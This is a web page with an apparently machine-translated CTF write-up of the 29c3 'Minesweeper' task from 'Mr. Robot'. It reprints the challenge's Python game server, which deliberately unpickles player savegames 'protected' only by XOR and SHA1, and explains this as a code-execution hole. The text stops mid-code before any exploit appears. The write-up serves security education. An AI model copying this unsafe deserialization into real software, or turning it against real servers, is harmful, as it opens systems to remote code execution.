<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>The art of exploiting minefields: We analyze CTF-task about the game of Minesweeper from "Mr. Robot"</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hello, Habrodam and Habrogospoda! 

 Recently I accidentally caught my eye on an episode from the recently fashionable series ‚ÄúMr. Robot‚Äù. Not being v...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>The art of exploiting minefields: We analyze CTF-task about the game of Minesweeper from "Mr. Robot"</h1><div class="post__text post__text-html js-mediator-article"><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/4ee/648/2dd/4ee6482dd288bd35acd0476969d1ade3.png" alt="image"></div><br>  Hello, Habrodam and Habrogospoda! <br><br>  Recently I accidentally caught my eye on an episode from the recently fashionable series ‚ÄúMr. Robot‚Äù.  Not being very familiar with the project, I still knew about the massive PR campaign associated with it (which even seemed to hold something like an <a href="https://ru.wikipedia.org/wiki/%25D0%2598%25D0%25B3%25D1%2580%25D0%25B0_%25D0%25B2_%25D0%25B0%25D0%25BB%25D1%258C%25D1%2582%25D0%25B5%25D1%2580%25D0%25BD%25D0%25B0%25D1%2582%25D0%25B8%25D0%25B2%25D0%25BD%25D0%25BE%25D0%25B9_%25D1%2580%25D0%25B5%25D0%25B0%25D0%25BB%25D1%258C%25D0%25BD%25D0%25BE%25D1%2581%25D1%2582%25D0%25B8">ARG</a> event), so when I heard the condition of an entertaining CTF task (from the <i>bin</i> / <i>exploitation</i> genre) presented in the plot of one of the series, I thought that most likely, this task existed in reality.  Referring to the World Wide Web, I confirmed my assumption, and, since the task is not very difficult (I don‚Äôt have enough time to get bored with one habrostat), but extremely original and interesting, today we will deal with its analysis. <br>  Cut, cut, cut! <br><a name="habracut"></a><br><h2>  <font color="#cc0000">Preview</font> </h2><br>  In a nutshell, how it looked from TV screens: in one episode (3rd season, 1st series, ~ 20: 20-22: 50), the audience is presented with an ‚Äúunderground hacker institution‚Äù, aka drawn-in anarchist graffiti closet, overloaded with computers, kilometers of yellow patch cords and several cyberpunk-like Asians.  Here, surrounded by neon vape-pair and a kaleidoscope of acid-green letters on the slate-black backgrounds of the terminals of the machines, the very height of the passions of the CTF-competition heated up.  GG comes up to one of the participants, who complains to him that he cannot cope with one of the tasks, GG in 25 seconds explains all the secrets of the task to him, without even looking at the monitor, GG knocks the flag out.  The end. <br><br>  Now about the task itself: this is the real <a href="https://ctftime.org/task/193">task of</a> exploring the source code, which is 100 points (minimum, he-he), which appeared in 29c3 CTF (2012).  To solve this problem, we will need: 1 part of basic cryptography knowledge and 2 parts of Python knowledge (one to <i>pickle.loads () to</i> see the vulnerability of shellcode implementation, the other to write a couple of lines of exploit). 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      To begin, consider the condition. <br><br><h2>  <font color="#cc0000">Condition</font> </h2><br><blockquote>  Enough of reversing?  Play this game if you want, you can even save it  XX.XX.XX.XX: 1024 <br>  &lt;http: //and_tut_say_s_iskhodnikom/minesweeper.py&gt; </blockquote><br>  Free translation from the author: <br><blockquote>  Tired of reversing?  Distract a little and play our toy, and if you want, you can even save yourself to continue where you stopped!  XX.XX.XX.XX: 1024 <br>  &lt;http: //and_tut_say_s_iskhodnikom/minesweeper.py&gt; </blockquote><br>  The source code that comes with the task is hidden under the spoiler: <br><div class="spoiler">  <b class="spoiler_title">minesweeper.py</b> <div class="spoiler_text"><pre><code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python import bisect, random, socket, signal, base64, pickle, hashlib, sys, re, os def load_encrypt_key(): try: f = open('encrypt_key.bin', 'r') try: encrypt_key = f.read(4096) if len(encrypt_key) == 4096: return encrypt_key finally: f.close() except: pass rand = random.SystemRandom() encrypt_key = "" for i in xrange(0, 4096): encrypt_key += chr(rand.randint(0,255)) try: f = open('encrypt_key.bin', 'w') try: f.write(encrypt_key) finally: f.close() except: pass return encrypt_key class Field: def __init__(self, w, h, mines): self.w = w self.h = h self.mines = set() while len(self.mines) &lt; mines: y = random.randint(0, h - 1) x = random.randint(0, w - 1) self.mines.add((y, x)) self.mines = sorted(self.mines) self.opened = [] self.flagged = [] def calc_num(self, point): n = 0 for y in xrange(point[0] - 1, point[0] + 2): for x in xrange(point[1] - 1, point[1] + 2): p = (y, x) if p != point and p in self.mines: n += 1 return n def open(self, y, x): point = (int(y), int(x)) if point[0] &lt; 0 or point[0] &gt;= self.h: return (True, "Illegal point") if point[1] &lt; 0 or point[1] &gt;= self.w: return (True, "Illegal point") if point in self.opened: return (True, "Already opened") if point in self.flagged: return (True, "Already flagged") bisect.insort(self.opened, point) if point in self.mines: return (False, "You lose") if len(self.opened) + len(self.mines) == self.w * self.h: return (False, "You win") if self.calc_num(point) == 0: #open everything around - it can not result in something bad self.open(y-1, x-1) self.open(y-1, x) self.open(y-1, x+1) self.open(y, x-1) self.open(y, x+1) self.open(y+1, x-1) self.open(y+1, x) self.open(y+1, x+1) return (True, None) def flag(self, y, x): point = (int(y), int(x)) if point[0] &lt; 0 or point[0] &gt;= self.h: return "Illegal point" if point[1] &lt; 0 or point[1] &gt;= self.w: return "Illegal point" if point in self.opened: return "Already opened" if point in self.flagged: self.flagged.remove(point) else: bisect.insort(self.flagged, point) return None def load(self, data): self.__dict__ = pickle.loads(data) def save(self): return pickle.dumps(self.__dict__, 1) def write(self, stream): mine = 0 open = 0 flag = 0 screen = " " + ("0123456789" * ((self.w + 9) / 10))[0:self.w] + "\n +" + ("-" * self.w) + "+\n" for y in xrange(0, self.h): have_mines = mine &lt; len(self.mines) and self.mines[mine][0] == y have_opened = open &lt; len(self.opened) and self.opened[open][0] == y have_flagged = flag &lt; len(self.flagged) and self.flagged[flag][0] == y screen += chr(0x30 | (y % 10)) + "|" for x in xrange(0, self.w): is_mine = have_mines and self.mines[mine][1] == x is_opened = have_opened and self.opened[open][1] == x is_flagged = have_flagged and self.flagged[flag][1] == x assert(not (is_opened and is_flagged)) if is_mine: mine += 1 have_mines = mine &lt; len(self.mines) and self.mines[mine][0] == y if is_opened: open += 1 have_opened = open &lt; len(self.opened) and self.opened[open][0] == y if is_mine: c = "*" else: c = ord("0") #check prev row for m in xrange(mine - 1, -1, -1): if self.mines[m][0] &lt; y - 1: break if self.mines[m][0] == y - 1 and self.mines[m][1] in (x - 1, x, x + 1): c += 1 #check left &amp; right if mine &gt; 0 and self.mines[mine - 1][0] == y and self.mines[mine - 1][1] == x - 1: c += 1 if have_mines and self.mines[mine][1] == x + 1: c += 1 #check next row for m in xrange(mine, len(self.mines)): if self.mines[m][0] &gt; y + 1: break if self.mines[m][0] == y + 1 and self.mines[m][1] in (x - 1, x, x + 1): c += 1 c = chr(c) elif is_flagged: flag += 1 have_flagged = flag &lt; len(self.flagged) and self.flagged[flag][0] == y c = "!" else: c = " " screen += c screen += "|" + chr(0x30 | (y % 10)) + "\n" screen += " +" + ("-" * self.w) + "+\n " + ("0123456789" * ((self.w + 9) / 10))[0:self.w] + "\n" stream.send(screen) sock = socket.socket() sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind(('0.0.0.0', 1024)) sock.listen(10) signal.signal(signal.SIGCHLD, signal.SIG_IGN) encrypt_key = load_encrypt_key() while 1: client, addr = sock.accept() if os.fork() == 0: break client.close() sock.close() f = Field(16, 16, 20) re_pos = re.compile("^. *([0-9]+)[ :;,]+([0-9]+) *$") re_save = re.compile("^. *([0-9a-zA-Z+/]+=*) *$") def handle(line): if len(line) &lt; 1: return (True, None) if len(line) == 1 and line[0] in "qxQX": return (False, "Bye") global f if line[0] in "foFO": m = re_pos.match(line) if m is None: return (True, "Usage: '([oOfF]) *([0-9]+)[ :;,]+([0-9]+) *', Cmd=\\1(Open/Flag) X=\\2 Y=\\3") x,y = m.groups() x = int(x) y = int(y) if line[0] in "oO": return f.open(y,x) else: return (True, f.flag(y,x)) elif line[0] in "lL": m = re_save.match(line) if m is None: return (True, "Usage: '([lL]) *([0-9a-zA-Z+/]+=*) *', Cmd=\\1(Load) Save=\\2") msg = base64.standard_b64decode(m.group(1)) tmp = "" for i in xrange(0, len(msg)): tmp += chr(ord(msg[i]) ^ ord(encrypt_key[i % len(encrypt_key)])) msg = tmp if msg[0:9] != "4n71cH3aT": return (True, "Unable to load savegame (magic)") h = hashlib.sha1() h.update(msg[9+h.digest_size:]) if msg[9:9+h.digest_size] != h.digest(): return (True, "Unable to load savegame (checksum)") try: f.load(msg[9+h.digest_size:]) except: return (True, "Unable to load savegame (exception)") return (True, "Savegame loaded") elif len(line) == 1 and line[0] in "sS": msg = f.save() h = hashlib.sha1() h.update(msg) msg = "4n71cH3aT" + h.digest() + msg tmp = "" for i in xrange(0, len(msg)): tmp += chr(ord(msg[i]) ^ ord(encrypt_key[i % len(encrypt_key)])) msg = tmp return (True, "Your savegame: " + base64.standard_b64encode(msg)) #elif len(line) == 1 and line[0] in "dD": # return (True, repr(f.__dict__)+"\n") else: return (True, "Unknown Command: '" + line[0] + "', valid commands: ofqxls") data = "" while 1: f.write(client) while 1: pos = data.find("\n") if pos != -1: cont, msg = handle(data[0:pos]) if not cont: if msg is not None: client.send(msg + "\n") f.write(client) client.close() sys.exit(0) if msg is not None: client.send(msg + "\n") data = data[pos+1:] break new_data = client.recv(4096) if len(new_data) == 0: sys.exit(0) data += new_data</span></span></code> </pre> <br></div></div><br>  In fact, we have a trivial client-server application that ‚Äúplays‚Äù with you in Minesweeper.  The attached source is rotated on the server, access to which the participants have only through the modest cli-interface of netcat, the client side of the game.  As a result, in order to get the flag, the player needs to find a weak spot in the implementation of the self-made Minesweeper in order to gain access to the server's file system (obviously, the flag is there, where else can it be). <br><br>  It's time to delve into other people's sources ... <br><br><h2>  <font color="#cc0000">Source code research</font> </h2><br><h3>  <font color="#800000">import pickle</font> </h3><br>  As already mentioned, a person with a pinch of knowledge of the Python Standard Library will see one of the research vectors already on the second line of the source file: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> bisect, random, socket, signal, base64, pickle, hashlib, sys, re, os</code> </pre><br>  The program uses the <i>pickle</i> module, which means most likely (bearing in mind the opportunity to save and load the game state), we will see a call to the <i>piclke.loads ()</i> method, which is known to be vulnerable to the execution of arbitrary code. <br><br>  The theory tells us that the <i>pickle</i> library is used to <b>serialize</b> and <b>deserialize</b> Python objects, i.e., to <b>preserve the</b> state of objects in the form of bit sequences (according to a certain algorithm, protocol), respectively, for the purpose of their long-term storage in files on railways, network transfers, etc., and <b>recovering</b> this state from the same bit sequence for further use in the program body.  BUT, also, the theory (on behalf of Python documentation) politely <a href="https://docs.python.org/3.1/library/pickle.html">warns</a> us in bold letters on a red background that we must be sure of the <i>reliability of the</i> data that we deserialize so as not to fall victim to the execution of a specially crafted file with a malicious load that can spoil our life. <br><br>  Remember this moment and go further along the code. <br><br><h4>  <font color="#800000">load_encrypt_key ()</font> </h4><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">load_encrypt_key</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: f = open(<span class="hljs-string"><span class="hljs-string">'encrypt_key.bin'</span></span>, <span class="hljs-string"><span class="hljs-string">'r'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: encrypt_key = f.read(<span class="hljs-number"><span class="hljs-number">4096</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(encrypt_key) == <span class="hljs-number"><span class="hljs-number">4096</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> encrypt_key <span class="hljs-keyword"><span class="hljs-keyword">finally</span></span>: f.close() <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">pass</span></span> rand = random.SystemRandom() encrypt_key = <span class="hljs-string"><span class="hljs-string">""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">4096</span></span>): encrypt_key += chr(rand.randint(<span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">255</span></span>)) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: f = open(<span class="hljs-string"><span class="hljs-string">'encrypt_key.bin'</span></span>, <span class="hljs-string"><span class="hljs-string">'w'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: f.write(encrypt_key) <span class="hljs-keyword"><span class="hljs-keyword">finally</span></span>: f.close() <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">pass</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> encrypt_key</code> </pre><br>  Immediately, we see a function with the frightening name <i>load_encrypt_key ()</i> , which suggests that the game will have a method for checking / signing something (stored data?) With a secret key stored on the server. <br><br>  The function does nothing else but loads the secret key: if it exists, the server takes it from the <i>encrypt_key.bin</i> file; otherwise, such a file is generated and clogged with random single-byte values.  Size of the secret key: 4096 bytes.  Remember, go ahead. <br><br><h4>  <font color="#800000">class Field</font> </h4><br>  This is followed by a class that describes the field for playing Mines: <br><pre> <code class="python hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Field</span></span></span><span class="hljs-class">:</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__init__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, w, h, mines)</span></span></span><span class="hljs-function">:</span></span> self.w = w self.h = h self.mines = set() <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> len(self.mines) &lt; mines: y = random.randint(<span class="hljs-number"><span class="hljs-number">0</span></span>, h - <span class="hljs-number"><span class="hljs-number">1</span></span>) x = random.randint(<span class="hljs-number"><span class="hljs-number">0</span></span>, w - <span class="hljs-number"><span class="hljs-number">1</span></span>) self.mines.add((y, x)) self.mines = sorted(self.mines) self.opened = [] self.flagged = [] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">calc_num</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, point)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-comment"><span class="hljs-comment"># ... def open(self, y, x): # ... def flag(self, y, x): # ... def load(self, data): self.__dict__ = pickle.loads(data) def save(self): return pickle.dumps(self.__dict__, 1) def write(self, stream): # ...</span></span></code> </pre><br>  I deliberately left only what deserves our attention, namely: a constructor describing the fields of the <i>Field</i> ( <i>w</i> - width, <i>h</i> - height, <i>mines</i> - a list with coordinates of mines [generated randomly] and lists of coordinates of open and cleared cells - <i>opened</i> and <i>flagged</i> respectively), as well as methods for loading and saving the game. <br><br>  Our assumption turned out to be true - <i>piclke.loads ()</i> and the truth is used to load the game.  How it happens: the <i>Field.save ()</i> method pushes the field state into a sequence of bits (using protocol 1 of the <i>pickle.dumps ()</i> method), and the <i>Field.load ()</i> method restores this sequence at the player‚Äôs request, returning that game process moment to it where he stopped. <br><br>  The methods in which the description is omitted are the direct components of the implementation of the gameplay itself and do not contain information that would be useful for a <s>hacker</s> to a security researcher.  Names reflect their purpose. <br><br><h4>  <font color="#800000">Connection initialization</font> </h4><br>  Next we see a piece of code for establishing a connection between the client and the server, loading the secret key and creating an instance of the <i>Field</i> class, 16x16 in size and with the number of mines equal to 20: <br><pre> <code class="python hljs">sock = socket.socket() sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number"><span class="hljs-number">1</span></span>) sock.bind((<span class="hljs-string"><span class="hljs-string">'0.0.0.0'</span></span>, <span class="hljs-number"><span class="hljs-number">1024</span></span>)) sock.listen(<span class="hljs-number"><span class="hljs-number">10</span></span>) signal.signal(signal.SIGCHLD, signal.SIG_IGN) encrypt_key = load_encrypt_key() <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>: client, addr = sock.accept() <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> os.fork() == <span class="hljs-number"><span class="hljs-number">0</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> client.close() sock.close() f = Field(<span class="hljs-number"><span class="hljs-number">16</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>, <span class="hljs-number"><span class="hljs-number">20</span></span>)</code> </pre><br>  I note that you can play Minesweeper with only one PC. <br><blockquote>  <u><i>Minute PARANOUI:</i></u> performing the action below is equivalent to opening a port with an application vulnerable to receiving a shell, therefore, if the port is accessible from the outside, those who decide to test the script are recommended to change the bind interface from <b>0.0.0.0</b> to <b>127.0.0.1</b> . </blockquote><br>  If you run the program in one terminal window, and in the other you set <code>$ nc 0.0.0.0 1024</code> , the effect will be the same as when playing with a remote server. <br><br>  Well, let's do it.  Since the output is voluminous, the result is under the spoiler: <br><div class="spoiler">  <b class="spoiler_title">Test connection</b> <div class="spoiler_text"><img src="https://habrastorage.org/getpro/habr/post_images/6e6/ba4/5ed/6e6ba45ed85e2b7f599c22f3f099cee6.jpg" alt="image"><br></div></div><br>  What we have: <br><ol><li>  After the first input of the character ‚Äúh‚Äù (I wanted some help), the list of commands became available to us: <i>o</i> , <i>f</i> , <i>q</i> , <i>x</i> , <i>l</i> , <i>s</i> .  We will find out a little later that <i>o</i> - open (open cell), <i>f</i> - flag (clear cell), <i>q</i> - quit (exit game), <i>x</i> - exit (exit game), <i>l</i> - load (load game), <i>s</i> - save (save game). </li><li>  The output of the <i>save</i> command is in the form of a base64 string. </li><li>  Input for the <i>load</i> command must also be a base64 string. </li></ol><br>  Wonderful!  Let's go back to the code. <br><br><h4>  <font color="#800000">handle ()</font> </h4><br>  We have reached the most interesting part - the user input processing functions: <br><div class="spoiler">  <b class="spoiler_title">handle ()</b> <div class="spoiler_text"><pre> <code class="python hljs">re_pos = re.compile(<span class="hljs-string"><span class="hljs-string">"^. *([0-9]+)[ :;,]+([0-9]+) *$"</span></span>) re_save = re.compile(<span class="hljs-string"><span class="hljs-string">"^. *([0-9a-zA-Z+/]+=*) *$"</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">handle</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(line)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(line) &lt; <span class="hljs-number"><span class="hljs-number">1</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">None</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(line) == <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> line[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-string"><span class="hljs-string">"qxQX"</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">False</span></span>, <span class="hljs-string"><span class="hljs-string">"Bye"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">global</span></span> f <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> line[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-string"><span class="hljs-string">"foFO"</span></span>: m = re_pos.match(line) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> m <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span class="hljs-keyword">None</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">"Usage: '([oOfF]) *([0-9]+)[ :;,]+([0-9]+) *', Cmd=\\1(Open/Flag) X=\\2 Y=\\3"</span></span>) x,y = m.groups() x = int(x) y = int(y) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> line[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-string"><span class="hljs-string">"oO"</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> f.open(y,x) <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, f.flag(y,x)) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> line[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-string"><span class="hljs-string">"lL"</span></span>: m = re_save.match(line) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> m <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span class="hljs-keyword">None</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">"Usage: '([lL]) *([0-9a-zA-Z+/]+=*) *', Cmd=\\1(Load) Save=\\2"</span></span>) msg = base64.standard_b64decode(m.group(<span class="hljs-number"><span class="hljs-number">1</span></span>)) tmp = <span class="hljs-string"><span class="hljs-string">""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(msg)): tmp += chr(ord(msg[i]) ^ ord(encrypt_key[i % len(encrypt_key)])) msg = tmp <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> msg[<span class="hljs-number"><span class="hljs-number">0</span></span>:<span class="hljs-number"><span class="hljs-number">9</span></span>] != <span class="hljs-string"><span class="hljs-string">"4n71cH3aT"</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">"Unable to load savegame (magic)"</span></span>) h = hashlib.sha1() h.update(msg[<span class="hljs-number"><span class="hljs-number">9</span></span>+h.digest_size:]) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> msg[<span class="hljs-number"><span class="hljs-number">9</span></span>:<span class="hljs-number"><span class="hljs-number">9</span></span>+h.digest_size] != h.digest(): <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">"Unable to load savegame (checksum)"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: f.load(msg[<span class="hljs-number"><span class="hljs-number">9</span></span>+h.digest_size:]) <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">"Unable to load savegame (exception)"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">"Savegame loaded"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> len(line) == <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> line[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-string"><span class="hljs-string">"sS"</span></span>: msg = f.save() h = hashlib.sha1() h.update(msg) msg = <span class="hljs-string"><span class="hljs-string">"4n71cH3aT"</span></span> + h.digest() + msg tmp = <span class="hljs-string"><span class="hljs-string">""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(msg)): tmp += chr(ord(msg[i]) ^ ord(encrypt_key[i % len(encrypt_key)])) msg = tmp <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">"Your savegame: "</span></span> + base64.standard_b64encode(msg)) <span class="hljs-comment"><span class="hljs-comment">#elif len(line) == 1 and line[0] in "dD": # return (True, repr(f.__dict__)+"\n") else: return (True, "Unknown Command: '" + line[0] + "', valid commands: ofqxls")</span></span></code> </pre><br></div></div><br>  Again, consider only significant points.  Let's start with the part that is responsible for saving the game: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> len(line) == <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> line[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-string"><span class="hljs-string">"sS"</span></span>: msg = f.save() h = hashlib.sha1() h.update(msg) msg = <span class="hljs-string"><span class="hljs-string">"4n71cH3aT"</span></span> + h.digest() + msg tmp = <span class="hljs-string"><span class="hljs-string">""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(msg)): tmp += chr(ord(msg[i]) ^ ord(encrypt_key[i % len(encrypt_key)])) msg = tmp <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>, <span class="hljs-string"><span class="hljs-string">"Your savegame: "</span></span> + base64.standard_b64encode(msg))</code> </pre><br>  Saving occurs in 4 stages: <br><ol><li>  <code>msg = f.save()</code> - save a dump of the current state of the <i>Field</i> . </li><li> <code>h = hashlib.sha1(); h.update(msg); msg = "4n71cH3aT" + h.digest() + msg</code>  <code>h = hashlib.sha1(); h.update(msg); msg = "4n71cH3aT" + h.digest() + msg</code> - we take the sha1-hash from the received message and perform the concatenation operation: the hash together with the salt (" <i>4n71cH3aT</i> " line) is added to the beginning of the message. </li><li>  <code>for i in xrange(0, len(msg)): tmp += chr(ord(msg[i]) ^ ord(encrypt_key[i % len(encrypt_key)]))</code> - sign the message: xor'im each message byte with the next byte of the secret key. </li><li>  <code>return (True, "Your savegame: " + base64.standard_b64encode(msg))</code> - return the base64-string from the signed message.  This is our save. </li></ol><br>  Consider downloading: <br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> line[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-string"><span class="hljs-string">"lL"</span></span>: m = re_save.match(line) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> m <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span 